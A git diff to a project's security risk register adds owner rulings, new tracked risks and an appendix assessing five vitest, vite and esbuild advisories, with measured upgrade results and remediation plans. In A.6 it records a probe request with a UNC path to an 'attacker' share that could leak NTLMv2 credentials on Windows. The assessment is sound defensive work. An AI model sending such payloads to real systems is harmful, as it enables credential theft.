@@ -26,6 +26,16 @@ _maximum plausible impact of the gap if the system were carrying production traf
 only reading that makes the register useful for sequencing. It is not a claim that the risk is live
 today — nothing is deployed.
 
+**Evidence rule (owner ruling 1).** No requirement may be marked satisfied merely because it appears
+in documentation. Acceptance requires repository and test evidence. This restates the scoring rule
+above rather than adding a new one, and it applies to the v1.4.0 `NA-01`…`NA-20` gates equally when
+they begin to be scored.
+
+**Roadmap context (owner ruling 1).** v1.2's ten-PR sequence is the delivery spine; v1.3.0 is the
+mandatory control and acceptance overlay; v1.4.0 is the mandatory architectural and interoperability
+overlay. Gates in this register are the v1.3.0 overlay applied to that spine — not a separate
+programme. See `README.md` §A.5.
+
 ---
 
 ## 1. Gate matrix — all 32 gates
@@ -165,6 +175,19 @@ and the only R4. It is not urgent _today_ because there is no production data, a
 urgent the moment there is — which is why it must be sequenced before, not after, the first
 environment carries real records.
 
+**Owner ruling 6 — accepted as the only current R4, and it must remain prominently tracked.**
+Closure is **SR-12** (`PHASE_0_PR_PLAN.md` §D-8d), sequenced immediately after SR-2, or earlier if it
+can be completed without conflicting with PR #5 or SR-2. It is no longer blocked on a cloud decision:
+the smallest reviewable form proves the procedure against a local synthetic database.
+
+**Documentation alone will not close this.** Closure requires nine evidence items — a backup taken
+from a safe synthetic or approved nonproduction database; encrypted storage and access controls;
+restoration into an isolated environment; post-restore integrity checks; **post-restore
+tenant-boundary verification**; measured recovery time and observed data-loss window; documented
+failure handling; repeatable commands or automation; and no production customer data in chat,
+commits, or fixtures. **Backup capability may not be represented as accepted until an actual restore
+has succeeded and the evidence is preserved.** DR-01 and DR-02 stay NOT IMPLEMENTED until then.
+
 ### 5. Unsafe live external side effects and duplicate effects — **R3**
 
 No live side effect exists, which is the correct state and is enforced by scope validation, unsigned
@@ -200,6 +223,20 @@ dangerous to defer, provided they are not deferred past the point where a real e
 
 ---
 
+## 2a. Tracked risks opened by this Phase 0
+
+Risks opened here are prefixed `PR0-R-` so they do not collide with the `R-01`…`R-15` series in
+`docs/governance/RISK_REGISTER.md`.
+
+| ID       | Risk                                                                                                                                                                                                                                      | Tier                                               | Status                                     | Owner       | Closure                                                                                                                                                                                                         |
+| -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------- | ------------------------------------------ | ----------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| PR0-R-16 | **Five open dependency advisories, and CI performs no dependency scan.** 1 critical, 1 high, 3 moderate, all in the `vitest` test toolchain. Surfaced by GitHub Dependabot on push; the repository's own pipeline does not look for them. | R2 — see Appendix A for the per-advisory reasoning | **Open**                                   | Engineering | **SR-10** (isolated remediation, no forced or broad upgrade) then **SR-11** (blocking dependency scan in CI). Neither may be mixed into SR-2.                                                                   |
+| PR0-R-17 | **Versioned handoff packages can be edited without their digest being regenerated.** The defect that made `main` red at `1f74bdd`. Owner ruling 2 fixes the forward rule; nothing enforces it yet.                                        | R1                                                 | **Open — rule fixed, enforcement pending** | Engineering | **SR-9** (registry outside checksummed packages) and **SR-8** (validator that fails when a checksummed historical package is modified at all, plus verification of the two unverified `MANIFEST.sha256` files). |
+
+Appendix A holds the full per-advisory assessment for PR0-R-16.
+
+---
+
 ## 3. Alignment with the existing risk register
 
 `docs/governance/RISK_REGISTER.md` holds 15 build-scope risks (R-01…R-15) framed for Horizon 1
@@ -223,19 +260,224 @@ delivery, not for production security. The two registers do not conflict and sho
 Recorded so the owner sees which are genuinely open and which the repository has effectively
 settled.
 
-| Decision                    | Required before | Repository position                                                                                                                                                                        |
-| --------------------------- | --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| Identity provider strategy  | Phase 1         | **Open.** No provider chosen. The package recommends managed identity; the repository builds authorization internally and has no authentication at all.                                    |
-| Policy engine               | Phase 1         | **Open.** No engine. `config/policy/base_policy.yaml` holds vocabularies without rules.                                                                                                    |
-| Highly sensitive encryption | Phase 2         | Open. No KMS, no field encryption.                                                                                                                                                         |
-| Audit retention             | Phase 2         | Open. Audit exists; retention is unset (OQ-12).                                                                                                                                            |
-| Event platform              | Phase 3         | Open. Outbox table only; no broker selected.                                                                                                                                               |
-| Exactly-once policy         | Phase 3         | **Effectively settled by design** — the outbox carries a unique `event_id` and a claim lease, consistent with at-least-once delivery plus idempotent consumers. Needs recording as an ADR. |
-| Production SLOs             | Phase 4         | Open. `policies/slo-defaults.yaml` unused.                                                                                                                                                 |
-| Primary cloud and region    | Phase 5         | **Deliberately open** — Phase 0 was forbidden from selecting a provider.                                                                                                                   |
-| Backup isolation            | Phase 5         | Open.                                                                                                                                                                                      |
-| AI provider data policy     | Phase 6         | **Partially settled** — `MODEL_GATEWAY_ENABLED=false`, provider-independent gateway (ADR-0009/0016), no provider selected, so no training-rights exposure exists yet.                      |
-| Agent execution ceiling     | Phase 6         | **Settled and enforced** — every carrier agent resolves to A3 or lower in Horizon 1; `AUTONOMOUS_DISPATCH_A4_ENABLED` is mandatory-`false`; 25 of 32 agents clamped in CI.                 |
-| Autonomous remediation      | Phase 6         | Open. Nothing implemented; Level 1 is the package's recommended start.                                                                                                                     |
-| Cell placement unit         | Phase 7         | Open. ADR-0010 records intent only.                                                                                                                                                        |
-| External assurance          | Phase 8         | Open.                                                                                                                                                                                      |
+| Decision                    | Required before | Repository position                                                                                                                                                                                                                                     |
+| --------------------------- | --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Identity provider strategy  | Phase 1         | **Open.** No provider chosen. The package recommends managed identity; the repository builds authorization internally and has no authentication at all.                                                                                                 |
+| Policy engine               | Phase 1         | **Open.** No engine. `config/policy/base_policy.yaml` holds vocabularies without rules.                                                                                                                                                                 |
+| Highly sensitive encryption | Phase 2         | Open. No KMS, no field encryption.                                                                                                                                                                                                                      |
+| Audit retention             | Phase 2         | Open. Audit exists; retention is unset (OQ-12).                                                                                                                                                                                                         |
+| Event platform              | Phase 3         | Open. Outbox table only; no broker selected.                                                                                                                                                                                                            |
+| Exactly-once policy         | Phase 3         | **Effectively settled by design** — the outbox carries a unique `event_id` and a claim lease, consistent with at-least-once delivery plus idempotent consumers. Needs recording as an ADR.                                                              |
+| Production SLOs             | Phase 4         | Open. `policies/slo-defaults.yaml` unused.                                                                                                                                                                                                              |
+| Primary cloud and region    | Phase 5         | **Deliberately open** — Phase 0 was forbidden from selecting a provider.                                                                                                                                                                                |
+| Backup isolation            | Phase 5         | Open for _provider-specific_ isolation (cross-account, cross-region, object-lock). **Not blocking the R4 closure** — owner ruling 6 sequences SR-12 to prove backup and restore against a local synthetic database first, deferring provider selection. |
+| AI provider data policy     | Phase 6         | **Partially settled** — `MODEL_GATEWAY_ENABLED=false`, provider-independent gateway (ADR-0009/0016), no provider selected, so no training-rights exposure exists yet.                                                                                   |
+| Agent execution ceiling     | Phase 6         | **Settled and enforced** — every carrier agent resolves to A3 or lower in Horizon 1; `AUTONOMOUS_DISPATCH_A4_ENABLED` is mandatory-`false`; 25 of 32 agents clamped in CI.                                                                              |
+| Autonomous remediation      | Phase 6         | Open. Nothing implemented; Level 1 is the package's recommended start.                                                                                                                                                                                  |
+| Cell placement unit         | Phase 7         | Open. ADR-0010 records intent only.                                                                                                                                                                                                                     |
+| External assurance          | Phase 8         | Open.                                                                                                                                                                                                                                                   |
+
+---
+
+# Appendix A — Dependency advisory assessment (PR0-R-16)
+
+Produced in response to the owner instruction: _do not use a forced or broad dependency upgrade;
+produce a separate advisory assessment; add an automated dependency scan to CI through a dedicated
+reviewable change; do not mix dependency upgrades into SR-2._
+
+**Scope.** The five advisories `pnpm audit` reports at `1f74bdd` (exit 1 — `5 vulnerabilities found /
+3 moderate | 1 high | 1 critical`). All five enter through the single root devDependency `vitest`
+(`package.json:42`, `"vitest": "^2.1.8"` → `vitest@2.1.9`).
+
+**Method.** Static reachability against the _installed_ bytes in `node_modules/.pnpm`; each
+assessment then re-attacked by an independent verifier instructed to refute it; plus one coordinated
+upgrade executed in an isolated throwaway worktree with real exit statuses against a live
+PostgreSQL 16. **Four of the five first-pass assessments were refuted or materially corrected**; the
+corrected position is what is recorded here. The repository was not modified by the assessment.
+
+**Limits.** This is a per-advisory reachability and remediation assessment. It makes no statement
+about the repository's overall security posture, and **no gate — SDLC-02 or otherwise — is claimed
+to be satisfied by it.** `pnpm audit` is a lower bound: it reports only what the advisory database
+knows, which is itself part of the argument for SR-11.
+
+## A.1 Summary
+
+| Advisory            | Sev      | Package (installed)                      | Dependency path                           | Vulnerable code reachable?                                                                                                                                                  | Exposure                                              | Fixed versions                                                          | Disposition                                           |
+| ------------------- | -------- | ---------------------------------------- | ----------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- | ----------------------------------------------------------------------- | ----------------------------------------------------- |
+| GHSA-5xrq-8626-4rwp | critical | `vitest` 2.1.9                           | `.` → `vitest` (**direct devDependency**) | **No** — the file read/write RPC registers only under `options.api && options.watch`; every entry point is `vitest run`                                                     | dev + CI toolchain; not shipped                       | none on 2.x (the line ends at the installed 2.1.9); **≥ 3.2.6**         | remediate in SR-10                                    |
+| GHSA-fx2h-pf6j-xcff | high     | `vite` 5.4.21                            | `.` → `vitest` → `vite`                   | **No**, for two independent reasons: no socket is ever bound, and the one guard site vitest drives is short-circuited by `options.ssr \|\|`                                 | dev + CI toolchain; not shipped                       | none on 5.x (ends at 5.4.21); **≥ 6.4.3**                               | remediate in SR-10                                    |
+| GHSA-4w7w-66w2-5vf9 | moderate | `vite` 5.4.21                            | `.` → `vitest` → `vite`                   | **No** — the `.map` branch is entered only from an inbound HTTP request; `httpServer` is `null` in middleware mode                                                          | dev + CI toolchain; not shipped                       | **≥ 6.4.2**; practical floor ≥ 6.4.3                                    | remediate in SR-10                                    |
+| GHSA-v6wh-96g9-6wx3 | moderate | `vite` 5.4.21 (vendored `launch-editor`) | `.` → `vitest` → `vite`                   | **Reachable only under a configuration this repository does not use, and only on Windows.** The route is one standard command away — `pnpm exec vite` — not an obscure flag | dev workstation only (Windows); CI is `ubuntu-latest` | **≥ 6.4.3**                                                             | remediate in SR-10                                    |
+| GHSA-67mh-4wv8-2f99 | moderate | `esbuild` 0.21.5                         | `.` → `vitest` → `vite` → `esbuild`       | **No** — the vulnerable server is esbuild's own `serve()`, which vite never calls                                                                                           | dev + CI toolchain; not shipped                       | **≥ 0.25.0**; unreachable while on vite 5, which pins `esbuild ^0.21.3` | remediate in SR-10, as a consequence of the vite move |
+
+`pnpm why vite --depth 5` → "Found 1 version of vite". `pnpm why esbuild --depth 5` → "Found 1
+version of esbuild". No workspace package declares `vite`, `vitest`, or `esbuild`, or any
+devDependency at all.
+
+**Nothing ships.** No workspace package defines a `build` script, so root `"build": "turbo run build"`
+is a no-op; all packages are `private` and export raw TypeScript; there is no `dist/` outside
+`node_modules` and no Dockerfile. `ships_in_any_artifact = false` for all five — and that fact is
+load-bearing for every acceptance below.
+
+**Exposure wording, corrected.** "Development-only" is imprecise. The accurate classification is
+**development-and-CI**: `.github/workflows/ci.yml:8` is an unqualified `on: pull_request`, so fork
+pull requests are checked out and the toolchain runs against attacker-authored test files. That is
+not a path to any of these five — each needs a listening server, and two additionally need Windows —
+but it is where the code executes, and the record should say so plainly rather than lean on
+"it's only a devDependency".
+
+## A.2 Two commonly asserted mitigations that are false
+
+Recorded because either one, believed, would justify closing this risk without fixing it.
+
+1. **"`@vitest/ui` is not installed, so the server cannot start."** Vitest auto-installs it —
+   `ensureInstalled("@vitest/ui", …)` prompts on any TTY and runs `installPackage(…, { dev: true })`.
+2. **"Both the UI package and a flag are required."** Bare `--api` suffices;
+   `resolveApiServerConfig` turns it into `{ port: 51204 }`.
+
+The genuine reason GHSA-5xrq-8626-4rwp is not reachable is narrower and worth stating exactly:
+2.1.9 already token-gates `/__vitest_api__` with a `timingSafeEqual` comparison against a per-run
+UUID. What 3.2.6 adds is `allowWrite`/`allowExec` defaulting to false when `api.host` is
+non-loopback. **The residual risk in 2.1.9 is specifically an API or UI server bound to a
+non-loopback interface** — a container, devcontainer, or Codespace — where 2.1.9 has no such guard.
+
+## A.3 Compatibility — and a defect the upgrade surfaced
+
+`vitest.workspace.ts:25` sets `fileParallelism: false` on the integration project. Under vitest 3
+that is a type error (`'fileParallelism' does not exist in type 'ProjectConfig'`), because the pool
+reads the option from the **root** config only. An A/B probe showed the option is **already a
+silent no-op under vitest 2.1.9** — integration test files overlap today.
+
+**Correcting the consequence, which the first-pass analysis got wrong:** this does _not_ mean the
+integration files race on a shared database. `packages/database/test/integration/harness.ts:12-14`
+states that **each test file owns its own database**, precisely because "sharing one and resetting
+per file made files interfere whenever the runner overlapped them". Isolation is achieved by the
+harness, not by the config flag. So the defect is that **the configuration claims a guarantee it does
+not provide, and its comment gives a stale rationale** — a maintenance and comprehension hazard, not
+an active correctness bug. Tracked as **PR0-R-18** below.
+
+It must get its own change. **SR-10 must not "fix" it by deleting the key**, which would erase the
+record and silently change what the configuration asserts.
+
+### Coordinated upgrade — measured, in an isolated worktree
+
+| Command                                                              | Exit  | Result                                                               |
+| -------------------------------------------------------------------- | ----- | -------------------------------------------------------------------- |
+| `pnpm install --frozen-lockfile`                                     | 0     | `Packages: +181`                                                     |
+| `pnpm install --strict-peer-dependencies`                            | 0     | **zero** peer-dependency warnings                                    |
+| `pnpm typecheck` (and `--force`)                                     | 0     | 4 successful                                                         |
+| `pnpm test`                                                          | 0     | **56 passed — identical to baseline**                                |
+| `pnpm test:integration`                                              | 0     | **49 passed** against live PostgreSQL 16                             |
+| `pnpm test:all`                                                      | 0     | 105 passed                                                           |
+| `pnpm lint`, `format:check`, `validate:scope`, `validate:provenance` | 0     | `SCOPE_VALIDATION=PASS`, `PROVENANCE=PASS`                           |
+| `pnpm audit`                                                         | **0** | `No known vulnerabilities found` (baseline: exit 1, five advisories) |
+
+- `vitest.workspace.ts` needs **no edit**; `defineWorkspace` still works, but every run now prints a
+  non-fatal `DEPRECATED` banner. It becomes **fatal at vitest 4**, which removes `defineWorkspace`
+  entirely and which this repository has no root `vitest.config.ts` to migrate into. **Do not
+  "upgrade vitest" unqualified — `latest` is already 4.1.10.**
+- No test file needs editing: no test uses `vi.*`, `spyOn`, `mock`, or snapshots, so none of the
+  vitest 3 breaking changes applies — verified on `main` **and** on the PR #5 branch.
+- Node floors are satisfied by the declared `engines.node: ">=22.0.0"` and CI's `node-version: 22`.
+
+## A.4 Proposed isolated remediation — SR-10
+
+**The finding that determines the shape of the PR: bumping `vitest` alone does not clear four of the
+five advisories.** vitest 3.2.6 declares `vite: "^5.0.0 || ^6.0.0 || ^7.0.0-0"`, so pnpm legally
+keeps the existing `vite@5.4.21` pin — `pnpm audit` then still exits 1 with 4 vulnerabilities. An
+explicit override is required to make the resolution deterministic and reviewable.
+
+Two root files change, and nothing else:
+
+```diff
+# package.json
+-    "vitest": "^2.1.8"
++    "vitest": "3.2.6"
++  },
++  "pnpm": {
++    "overrides": {
++      "vite": "^6.4.3"
++    }
+```
+
+plus the regenerated `pnpm-lock.yaml`. Resulting tree: `vitest@3.2.6`, `vite@6.4.3`,
+`esbuild@0.25.12`. `esbuild` needs no override — vite 6.4.3 pins `esbuild ^0.25.0`. `vitest` is
+pinned **exactly**, because `@vitest/coverage-v8` peer-pins vitest to an exact version.
+
+**Caveat on the tested change, and an open owner decision.** `^6.4.3` resolves to 6.4.3 forever on a
+**terminal, EOL major** — structurally the same position that produced these findings on vite 5.
+`^7.3.6` is equally admitted by vitest 3.2.6 and is what a from-scratch resolution picks, but it was
+**not exercised** by the battery above and would require `engines.node ≥ 22.12.0`. If the owner
+prefers vite 7, **the entire battery must be re-run against it before merge** — do not swap the range
+on the strength of this document.
+
+**Merge-order coupling with PR #5.** That branch adds `"@vitest/coverage-v8": "^2.1.9"` and a
+`test:coverage` script wired into `verify`. `@vitest/coverage-v8` peer-pins vitest _exactly_, so
+`^2.1.9` cannot satisfy vitest 3.2.6. If PR #5 lands first, SR-10 becomes a **two**-line manifest
+change with both packages pinned to the same exact version. Merging the existing
+`origin/dependabot/npm_and_yarn/vitest-3.2.6` branch as-is, in either order, leaves an unmet exact
+peer — and it also predates PR #5's widening of the unit `include` glob.
+
+**What SR-10 must not change:** no source or test file (counts must stay 56 / 49 / 105 or every
+difference must be explained); not `vitest.workspace.ts`; not `ci.yml`; no coverage threshold
+relaxed; no runtime dependency; and **not combined with SR-2 or SR-11**.
+
+**Tests required before merge:** `pnpm audit` before and after with the exact advisory list ·
+`pnpm install --frozen-lockfile` · `pnpm install --strict-peer-dependencies` with zero warnings ·
+`pnpm typecheck` and `--force` · `pnpm test` · `pnpm test:integration` · `pnpm test:all` · `pnpm lint`
+· `format:check` · `validate:scope` · `validate:provenance` · `pnpm verify` · and an explicit
+resolution assertion, `pnpm why vite` and `pnpm why esbuild`, because the manifest edit alone does
+not guarantee the resolved versions.
+
+## A.5 Automated dependency scanning — SR-11
+
+A **blocking** audit step in the existing `verify` job, plus a license scan. Not advisory: `ci.yml`
+already documents this failure mode for the secret scan — a scan that reports success having read
+nothing is worse than no scan. Network or registry failure must fail loudly rather than be swallowed.
+
+Evidence for it already exists on both sides: today's `main` is the vulnerable tree (exit 1, five
+advisories) and the tested worktree is the remediated one (exit 0).
+
+**Ordering: SR-10 before SR-11**, or CI goes red the moment the scan lands. If the owner prefers
+SR-11 first, it must ship with an allowlist naming all five GHSAs, each with an owner and a **hard
+expiration date** (Article X). An allowlist without expiries reproduces the failure mode it exists to
+prevent.
+
+## A.6 Temporary acceptance, and what ends it
+
+Until SR-10 is approved and merged, all five remain open and are **temporarily accepted**.
+
+**Justification.** None of the five is reachable by any command this repository runs. Every one
+requires a listening Vite or Vitest HTTP server, and no script in `package.json`, no step in
+`ci.yml`, nothing in `scripts/`, no `vite.config.*`/`vitest.config.*`, no `.vscode`/`.idea`/
+`.devcontainer`, no Makefile and no git hook starts one. Nothing ships. Two of the five are
+additionally Windows-only and CI is `ubuntu-latest`. The remediation is a dev-toolchain major-version
+move the owner has not yet approved and which must not be forced.
+
+**The weakest acceptance, flagged rather than buried:** GHSA-v6wh-96g9-6wx3. Its route is live and
+unauthenticated the instant anyone runs `pnpm exec vite` — a standard command using a binary already
+present in `node_modules/.bin`. A verifier started it and confirmed
+`GET /__open-in-editor?file=\\attacker\share\x` returns **HTTP 200** with no auth, no CSRF token and
+no origin check. Only the Windows gate and the absence of any first-party command stand between this
+repository and a working NTLMv2 leak.
+
+**Conditions that end the acceptance — it does not expire quietly:**
+
+1. **SR-10 merges.** The intended end.
+2. Any script, workflow, runbook, devcontainer, IDE task, or git hook starts a listening Vite or
+   Vitest server (`vite`, `vitest --ui`, `vitest --api`, or `test.api` in config). Ends it for all five.
+3. Any developer runs the toolchain on **Windows**. Ends it for GHSA-v6wh-96g9-6wx3 and
+   GHSA-fx2h-pf6j-xcff immediately.
+4. The repository gains a devcontainer, Codespaces, or container dev flow where a server could bind a
+   non-loopback interface. Ends it for GHSA-5xrq-8626-4rwp.
+5. `vite`, `vitest`, or `esbuild` becomes a build or runtime dependency of anything that ships — any
+   workspace package gaining a `build` script, a bundler, or a published or containerised artifact.
+6. A new advisory lands against this subtree that is exploitable **without** a listening server.
+7. SR-11 lands before SR-10, in which case each advisory carries a named owner and a hard expiration
+   date, and the acceptance ends on that date regardless.
+
+## A.7 Additional risk opened by this appendix
+
+| ID       | Risk                                                                                                                                                                                                                                                                                                                                                                                                                                               | Tier | Status   | Closure                                                                                                                                                                                                  |
+| -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---- | -------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| PR0-R-18 | **`vitest.workspace.ts:25` asserts a serialisation guarantee it does not provide.** `fileParallelism: false` is a silent no-op in the per-project position under vitest 2.1.9, and a type error under vitest 3. Test isolation is actually provided by `harness.ts`, which gives each file its own database — so this is a comprehension and maintenance hazard, not an active correctness bug, and the option's comment states a stale rationale. | R1   | **Open** | Its own change — either a root-level setting the pool actually reads, or removal of the key together with a comment recording that `harness.ts` provides the isolation. **Not** to be folded into SR-10. |
